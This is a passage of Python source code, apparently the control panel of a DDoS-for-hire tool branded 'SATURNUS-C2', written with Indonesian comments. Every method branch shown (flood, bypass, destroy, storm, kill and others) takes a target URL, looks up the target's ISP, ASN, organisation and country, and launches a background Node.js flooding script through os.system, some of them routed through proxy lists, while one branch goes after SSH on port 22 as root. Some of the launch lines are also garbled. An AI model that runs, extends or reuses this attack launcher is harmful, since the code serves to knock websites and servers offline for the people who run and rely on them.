                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'rapid',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ SATURNUS-C2 ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m(\033[32m ATTACK SENT SUCCESSFULLY\033[31m )
\033[34m\033[1;37mHOST:        \033[31m(\033[36m {url}\033[31m )
\033[34m\033[1;37mPORT:        \033[31m(\033[36m {port}\033[31m )
\033[34m\033[1;37mTIME:        \033[31m(\033[36m {duration}\033[31m )
\033[34m\033[1;37mMETHOD:      \033[31m(\033[36m {sinput}\033[31m )
\033[34m\033[1;37mSTART ATTACK:\033[31m(\033[36m {waktu()} \033[31m)
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m (\033[36m {asn}\033[31m )
\033[34m\033[1;37mISP:        \033[31m (\033[36m {isp}\033[31m )
\033[34m\033[1;37mORG:        \033[31m (\033[36m {org}\033[31m )
\033[34m\033[1;37mCOUNTRY:    \033[31m (\033[36m {country}\033[31m )
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m (\033[36m t.me/SATURNUS-C2\033[31m )
\033[34m\033[1;37mOWNER:      \033[31m (\033[36m @SATURNUS-C2\033[31m )
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd meth && screen -dm node RAPID.js {url} {duration} 64 8 proxy.txt')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "bypass" or sinput == "BYPASS":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'bypass',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ SATURNUS-C2 ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m(\033[32m ATTACK SENT SUCCESSFULLY\033[31m )
\033[34m\033[1;37mHOST:        \033[31m(\033[36m {url}\033[31m )
\033[34m\033[1;37mPORT:        \033[31m(\033[36m {port}\033[31m )
\033[34m\033[1;37mTIME:        \033[31m(\033[36m {duration}\033[31m )
\033[34m\033[1;37mMETHOD:      \033[31m(\033[36m {sinput}\033[31m )
\033[34m\033[1;37mSTART ATTACK:\033[31m(\033[36m {waktu()} \033[31m)
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m (\033[36m {asn}\033[31m )
\033[34m\033[1;37mISP:        \033[31m (\033[36m {isp}\033[31m )
\033[34m\033[1;37mORG:        \033[31m (\033[36m {org}\033[31m )
\033[34m\033[1;37mCOUNTRY:    \033[31m (\033[36m {country}\033[31m )
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m (\033[36m t.me/SATURNUS-C2\033[31m )
\033[34m\033[1;37mOWNER:      \033[31m (\033[36m @SATURNUS-C2\033[31m )
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd meth && screen -dm node Bypass.js {url} {duration} 8 64 proxy.txt')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "browser" or sinput == "BROWSER":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'browser',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ SATURNUS-C2 ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m(\033[32m ATTACK SENT SUCCESSFULLY\033[31m )
\033[34m\033[1;37mHOST:        \033[31m(\033[36m {url}\033[31m )
\033[34m\033[1;37mPORT:        \033[31m(\033[36m {port}\033[31m )
\033[34m\033[1;37mTIME:        \033[31m(\033[36m {duration}\033[31m )
\033[34m\033[1;37mMETHOD:      \033[31m(\033[36m {sinput}\033[31m )
\033[34m\033[1;37mSTART ATTACK:\033[31m(\033[36m {waktu()} \033[31m)
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m (\033[36m {asn}\033[31m )
\033[34m\033[1;37mISP:        \033[31m (\033[36m {isp}\033[31m )
\033[34m\033[1;37mORG:        \033[31m (\033[36m {org}\033[31m )
\033[34m\033[1;37mCOUNTRY:    \033[31m (\033[36m {country}\033[31m )
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m (\033[36m t.me/SATURNUS-C2\033[31m )
\033[34m\033[1;37mOWNER:      \033[31m (\033[36m @SATURNUS-C2\033[31m )
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd ment && screen -dm node Browser.js {url} {duration} 8 64')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "h1-hold" or sinput == "H1-HOLD":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'h1-hold',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ SATURNUS-C2 ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m(\033[32m ATTACK SENT SUCCESSFULLY\033[31m )
\033[34m\033[1;37mHOST:        \033[31m(\033[36m {url}\033[31m )
\033[34m\033[1;37mPORT:        \033[31m(\033[36m {port}\033[31m )
\033[34m\033[1;37mTIME:        \033[31m(\033[36m {duration}\033[31m )
\033[34m\033[1;37mMETHOD:      \033[31m(\033[36m {sinput}\033[31m )
\033[34m\033[1;37mSTART ATTACK:\033[31m(\033[36m {waktu()} \033[31m)
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m (\033[36m {asn}\033[31m )
\033[34m\033[1;37mISP:        \033[31m (\033[36m {isp}\033[31m )
\033[34m\033[1;37mORG:        \033[31m (\033[36m {org}\033[31m )
\033[34m\033[1;37mCOUNTRY:    \033[31m (\033[36m {country}\033[31m )
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m (\033[36m t.me/SATURNUS-C2\033[31m )
\033[34m\033[1;37mOWNER:      \033[31m (\033[36m @SATURNUS-C2\033[31m )
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd meth && screen -dm node h1hold.js {url}')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "xyn" or sinput == "XYN":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'xyn',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ SATURNUS-C2 ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m(\033[32m ATTACK SENT SUCCESSFULLY\033[31m )
\033[34m\033[1;37mHOST:        \033[31m(\033[36m {url}\033[31m )
\033[34m\033[1;37mPORT:        \033[31m(\033[36m {port}\033[31m )
\033[34m\033[1;37mTIME:        \033[31m(\033[36m {duration}\033[31m )
\033[34m\033[1;37mMETHOD:      \033[31m(\033[36m {sinput}\033[31m )
\033[34m\033[1;37mSTART ATTACK:\033[31m(\033[36m {waktu()} \033[31m)
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m (\033[36m {asn}\033[31m )
\033[34m\033[1;37mISP:        \033[31m (\033[36m {isp}\033[31m )
\033[34m\033[1;37mORG:        \033[31m (\033[36m {org}\033[31m )
\033[34m\033[1;37mCOUNTRY:    \033[31m (\033[36m {country}\033[31m )
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m (\033[36m t.me/SATURNUS-C2\033[31m )
\033[34m\033[1;37mOWNER:      \033[31m (\033[36m @SATURNUS-C2\033[31m )
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd meth && screen -dm node xyn.js {url} {duration} 64 8 proxy.txt')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "flood" or sinput == "FLOOD":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'flood',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ SATURNUS-C2 ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m(\033[32m ATTACK SENT SUCCESSFULLY\033[31m )
\033[34m\033[1;37mHOST:        \033[31m(\033[36m {url}\033[31m )
\033[34m\033[1;37mPORT:        \033[31m(\033[36m {port}\033[31m )
\033[34m\033[1;37mTIME:        \033[31m(\033[36m {duration}\033[31m )
\033[34m\033[1;37mMETHOD:      \033[31m(\033[36m {sinput}\033[31m )
\033[34m\033[1;37mSTART ATTACK:\033[31m(\033[36m {waktu()} \033[31m)
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m (\033[36m {asn}\033[31m )
\033[34m\033[1;37mISP:        \033[31m (\033[36m {isp}\033[31m )
\033[34m\033[1;37mORG:        \033[31m (\033[36m {org}\033[31m )
\033[34m\033[1;37mCOUNTRY:    \033[31m (\033[36m {country}\033[31m )
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m (\033[36m t.me/SATURNUS-C2\033[31m )
\033[34m\033[1;37mOWNER:      \033[31m (\033[36m @SATURNUS-C2\033[31m )
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd meth && screen -dm node flood.js {url} {duration} 64 8 proxy.txt')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "destroy" or sinput == "DESTROY":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'destroy',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ SATURNUS-C2 ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m(\033[32m ATTACK SENT SUCCESSFULLY\033[31m )
\033[34m\033[1;37mHOST:        \033[31m(\033[36m {url}\033[31m )
\033[34m\033[1;37mPORT:        \033[31m(\033[36m {port}\033[31m )
\033[34m\033[1;37mTIME:        \033[31m(\033[36m {duration}\033[31m )
\033[34m\033[1;37mMETHOD:      \033[31m(\033[36m {sinput}\033[31m )
\033[34m\033[1;37mSTART ATTACK:\033[31m(\033[36m {waktu()} \033[31m)
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m (\033[36m {asn}\033[31m )
\033[34m\033[1;37mISP:        \033[31m (\033[36m {isp}\033[31m )
\033[34m\033[1;37mORG:        \033[31m (\033[36m {org}\033[31m )
\033[34m\033[1;37mCOUNTRY:    \033[31m (\033[36m {country}\033[31m )
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m (\033[36m t.me/SATURNUS-C2\033[31m )
\033[34m\033[1;37mOWNER:      \033[31m (\033[36m @SATURNUS-C2\033[31m )
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd meth && screen -dm node destroy.js {url} {duration} 64 8 proxy.txt')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "storm" or sinput == "STORM":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'storm',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ SATURNUS-C2 ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m(\033[32m ATTACK SENT SUCCESSFULLY\033[31m )
\033[34m\033[1;37mHOST:        \033[31m(\033[36m {url}\033[31m )
\033[34m\033[1;37mPORT:        \033[31m(\033[36m {port}\033[31m )
\033[34m\033[1;37mTIME:        \033[31m(\033[36m {duration}\033[31m )
\033[34m\033[1;37mMETHOD:      \033[31m(\033[36m {sinput}\033[31m )
\033[34m\033[1;37mSTART ATTACK:\033[31m(\033[36m {waktu()} \033[31m)
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m (\033[36m {asn}\033[31m )
\033[34m\033[1;37mISP:        \033[31m (\033[36m {isp}\033[31m )
\033[34m\033[1;37mORG:        \033[31m (\033[36m {org}\033[31m )
\033[34m\033[1;37mCOUNTRY:    \033[31m (\033[36m {country}\033[31m )
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m (\033[36m t.me/SATURNUS-C2\033[31m )
\033[34m\033[1;37mOWNER:      \033[31m (\033[36m @SATURNUS-C2\033[31m )
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd meth && screen -dm node Storm.js {url} {duration} 64 15 proxy.txt')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "Sat" or sinput == "sat":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'sat',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ SATURNUS-C2 ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m(\033[32m ATTACK SENT SUCCESSFULLY\033[31m )
\033[34m\033[1;37mHOST:        \033[31m(\033[36m {ip}\033[31m )
\033[34m\033[1;37mPORT:        \033[31m(\033[36m {port}\033[31m )
\033[34m\033[1;37mTIME:        \033[31m(\033[36m {duration}\033[31m )
\033[34m\033[1;37mMETHOD:      \033[31m(\033[36m {sinput}\033[31m )
\033[34m\033[1;37mSTART ATTACK:\033[31m(\033[36m {waktu()} \033[31m)
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m (\033[36m {asn}\033[31m )
\033[34m\033[1;37mISP:        \033[31m (\033[36m {isp}\033[31m )
\033[34m\033[1;37mORG:        \033[31m (\033[36m {org}\033[31m )
\033[34m\033[1;37mCOUNTRY:    \033[31m (\033[36m {country}\033[31m )
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m (\033[36m t.me/SATURNUS-C2\033[31m )
\033[34m\033[1;37mOWNER:      \033[31m (\033[36m @SATURNUS-C2\033[31m )
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd meth && screen -dm node node kill-ssh.js {ip} 22 root {time}')
            except ValueError:
                main()
            except IndexError:
                main()
                
        elif sinput == "hold" or sinput == "HOLD":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'hold',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ SATURNUS-C2 ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m(\033[32m ATTACK SENT SUCCESSFULLY\033[31m )
\033[34m\033[1;37mHOST:        \033[31m(\033[36m {url}\033[31m )
\033[34m\033[1;37mPORT:        \033[31m(\033[36m {port}\033[31m )
\033[34m\033[1;37mTIME:        \033[31m(\033[36m {duration}\033[31m )
\033[34m\033[1;37mMETHOD:      \033[31m(\033[36m {sinput}\033[31m )
\033[34m\033[1;37mSTART ATTACK:\033[31m(\033[36m {waktu()} \033[31m)
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m (\033[36m {asn}\033[31m )
\033[34m\033[1;37mISP:        \033[31m (\033[36m {isp}\033[31m )
\033[34m\033[1;37mORG:        \033[31m (\033[36m {org}\033[31m )
\033[34m\033[1;37mCOUNTRY:    \033[31m (\033[36m {country}\033[31m )
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m (\033[36m t.me/SATURNUS-C2\033[31m )
\033[34m\033[1;37mOWNER:      \033[31m (\033[36m @SATURNUS-C2\033[31m )
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd meth && screen -dm node hold.js {url} {duration} 64 8')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "cibi" or sinput == "CIBI":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'cibi',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ SATURNUS-C2 ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m(\033[32m ATTACK SENT SUCCESSFULLY\033[31m )
\033[34m\033[1;37mHOST:        \033[31m(\033[36m {url}\033[31m )
\033[34m\033[1;37mPORT:        \033[31m(\033[36m {port}\033[31m )
\033[34m\033[1;37mTIME:        \033[31m(\033[36m {duration}\033[31m )
\033[34m\033[1;37mMETHOD:      \033[31m(\033[36m {sinput}\033[31m )
\033[34m\033[1;37mSTART ATTACK:\033[31m(\033[36m {waktu()} \033[31m)
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m (\033[36m {asn}\033[31m )
\033[34m\033[1;37mISP:        \033[31m (\033[36m {isp}\033[31m )
\033[34m\033[1;37mORG:        \033[31m (\033[36m {org}\033[31m )
\033[34m\033[1;37mCOUNTRY:    \033[31m (\033[36m {country}\033[31m )
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m (\033[36m t.me/SATURNUS-C2\033[31m )
\033[34m\033[1;37mOWNER:      \033[31m (\033[36m @SATURNUS-C2\033[31m )
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd meth && screen -dm node Cibi.js {url} {duration} 64 8 proxy.txt')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "uam" or sinput == "UAM":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'uami',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ SATURNUS-C2 ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m(\033[32m ATTACK SENT SUCCESSFULLY\033[31m )
\033[34m\033[1;37mHOST:        \033[31m(\033[36m {url}\033[31m )
\033[34m\033[1;37mPORT:        \033[31m(\033[36m {port}\033[31m )
\033[34m\033[1;37mTIME:        \033[31m(\033[36m {duration}\033[31m )
\033[34m\033[1;37mMETHOD:      \033[31m(\033[36m {sinput}\033[31m )
\033[34m\033[1;37mSTART ATTACK:\033[31m(\033[36m {waktu()} \033[31m)
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m (\033[36m {asn}\033[31m )
\033[34m\033[1;37mISP:        \033[31m (\033[36m {isp}\033[31m )
\033[34m\033[1;37mORG:        \033[31m (\033[36m {org}\033[31m )
\033[34m\033[1;37mCOUNTRY:    \033[31m (\033[36m {country}\033[31m )
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m (\033[36m t.me/SATURNUS-C2\033[31m )
\033[34m\033[1;37mOWNER:      \033[31m (\033[36m @SATURNUS-C2\033[31m )
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd meth && screen -dm node uam.js {url} {duration} 64 8 proxy.txt')
            except ValueError:
                main()
            except IndexError:
                main()
                
        elif sinput == "kill" or sinput == "KILL":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'kill',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ SATURNUS-C2 ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m(\033[32m ATTACK SENT SUCCESSFULLY\033[31m )
\033[34m\033[1;37mHOST:        \033[31m(\033[36m {url}\033[31m )
\033[34m\033[1;37mPORT:        \033[31m(\033[36m {port}\033[31m )
\033[34m\033[1;37mTIME:        \033[31m(\033[36m {duration}\033[31m )
\033[34m\033[1;37mMETHOD:      \033[31m(\033[36m {sinput}\033[31m )
\033[34m\033[1;37mSTART ATTACK:\033[31m(\033[36m {waktu()} \033[31m)
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m (\033[36m {asn}\033[31m )
\033[34m\033[1;37mISP:        \033[31m (\033[36m {isp}\033[31m )
\033[34m\033[1;37mORG:        \033[31m (\033[36m {org}\033[31m )
\033[34m\033[1;37mCOUNTRY:    \033[31m (\033[36m {country}\033[31m )
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m (\033[36m t.me/SATURNUS-C2\033[31m )
\033[34m\033[1;37mOWNER:      \033[31m (\033[36m @SATURNUS-C2\033[31m )
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd meth && screen -dm node l kill.js {url} {duration} 64 8')
            except ValueError:
                main()
            except IndexError:
                main()

        elif sinput == "mixbill" or sinput == "MIXBILL":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                duration = int(sin.split()[3])

                # Mendapatkan IP dari URL
                ip = get_ip_from_url(url)

                if ip:
                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
                    asn, isp, org, country = get_ip_info(ip)
                    
                    # Menambahkan serangan ke dalam ongoing_attacks list
                    ongoing_attacks.append({
                        'host': ip,
                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
                        'duration': duration,  # Durasi serangan dalam detik
                        'method': 'mixbill',
                        'status': 'Ongoing'
                    })
                    os.system('clear')

                    print(f"""
\033[1;36m      POWERED BY : [ SATURNUS-C2 ]\033[0m
\033[34m
\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
\033[34m\033[1;37mSTATUS:      \033[31m(\033[32m ATTACK SENT SUCCESSFULLY\033[31m )
\033[34m\033[1;37mHOST:        \033[31m(\033[36m {url}\033[31m )
\033[34m\033[1;37mPORT:        \033[31m(\033[36m {port}\033[31m )
\033[34m\033[1;37mTIME:        \033[31m(\033[36m {duration}\033[31m )
\033[34m\033[1;37mMETHOD:      \033[31m(\033[36m {sinput}\033[31m )
\033[34m\033[1;37mSTART ATTACK:\033[31m(\033[36m {waktu()} \033[31m)
\033[34m
\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
\033[34m\033[1;37mASN:        \033[31m (\033[36m {asn}\033[31m )
\033[34m\033[1;37mISP:        \033[31m (\033[36m {isp}\033[31m )
\033[34m\033[1;37mORG:        \033[31m (\033[36m {org}\033[31m )
\033[34m\033[1;37mCOUNTRY:    \033[31m (\033[36m {country}\033[31m )
\033[34m
\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
\033[34m\033[1;37mTELE:       \033[31m (\033[36m t.me/SATURNUS-C2\033[31m )
\033[34m\033[1;37mOWNER:      \033[31m (\033[36m @SATURNUS-C2\033[31m )
\033[34m
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
